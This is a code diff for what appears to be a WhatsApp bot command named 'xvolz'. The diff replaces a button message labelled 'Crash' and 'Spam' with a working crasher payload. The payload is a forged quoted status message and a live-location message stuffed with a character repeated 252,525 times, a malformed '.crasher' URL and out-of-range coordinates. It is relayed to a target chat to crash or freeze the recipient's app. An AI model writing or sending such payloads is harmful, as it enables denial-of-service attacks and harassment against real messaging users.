@@ -51,52 +51,55 @@ END:VCARD`;
 
 case "xvolz": {
   try {
-    const buttons = [
-      {
-        name: "quick_reply",
-        buttonParamsJson: JSON.stringify({
-          display_text: "🔥 Crash",
-          id: "xvolz_btn_1"
-        })
-      },
-      {
-        name: "quick_reply",
-        buttonParamsJson: JSON.stringify({
-          display_text: "💥 Spam",
-          id: "xvolz_btn_2"
-        })
-      }
-    ];
+    const target = m.key.remoteJid;
 
-    const msg = {
-      viewOnceMessage: {
+    const fuckRexzSuki = {
+      key: {
+        participant: null,
+        remoteJid: "status@broadcast",
+        id: "©RexzSuki"
+      },
+      message: {
+        conversation: "㑒 `々—𝗥𝗲𝘅𝘇𝗦𝘂𝗸𝗶\n" + "ꦾ".repeat(252525)
+      },
+      pushName: "©RexzSuki"
+    };
+
+    const locationMsg = proto.Message.LocationMessage.fromObject({
+      degreesLatitude: -9.09165299926,
+      degreesLongitude: 199.197369996311,
+      name: "㑒 `々—𝗥𝗲𝘅𝘇𝗦𝘂𝗸𝗶\n" + "ꦾ".repeat(252525),
+      address: "\n",
+      url: "https://々—𝗥𝗲𝘅𝘇𝗦𝘂𝗸𝗶 " + "ꦃ".repeat(252) + ".crasher",
+      isLive: true,
+      accuracyInMeters: 252525,
+      jpegThumbnail: null,
+    });
+
+    const msgContent = {
+      ephemeralMessage: {
         message: {
-          interactiveMessage: {
-            body: { text: "*—𝘅𝘃𝗼𝗹𝘇 𝗰𝗿𝗮𝘀𝗵𝗲𝗿`*" },
-            footer: { text: "suki berkedok dev" },
-            header: { hasMediaAttachment: false },
-            nativeFlowMessage: {
-              buttons
+          viewOnceMessageV2: {
+            message: {
+              locationMessage: locationMsg
             }
           }
-        }
+        },
+        ephemeralExpiration: 999999
       }
     };
 
-    const sendMsg = generateWAMessageFromContent(
-      m.key.remoteJid,
-      msg,
-      { userJid: sock.user.id }
-    );
+    const msg = generateWAMessageFromContent(target, msgContent, {
+      userJid: sock.user.id,
+      quoted: fuckRexzSuki
+    });
 
-    await sock.relayMessage(
-      m.key.remoteJid,
-      sendMsg.message,
-      { messageId: sendMsg.key.id }
-    );
+    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
 
-  } catch (e) {
-    console.error("⚠️ Error case xvolz:", e);
+    console.log("xvolz location sent:", msg.key.id);
+
+  } catch (err) {
+    console.error("xvolz error:", err);
   }
   break;
 }
